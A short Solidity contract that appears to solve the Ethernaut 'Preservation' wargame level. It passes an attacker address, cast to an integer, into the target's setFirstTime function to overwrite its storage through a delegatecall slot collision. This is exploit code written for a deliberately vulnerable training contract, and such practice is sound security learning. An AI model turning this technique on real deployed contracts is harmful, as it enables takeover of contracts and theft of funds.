// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

contract EthernautLevl4 {
    address actacker;

    function setActacker(address _actacker) public {
        actacker = _actacker;
    }
    
    function actack(address challengeAddress) public {
        IPreservation(challengeAddress).setFirstTime(uint256(uint160(actacker)));
    }
}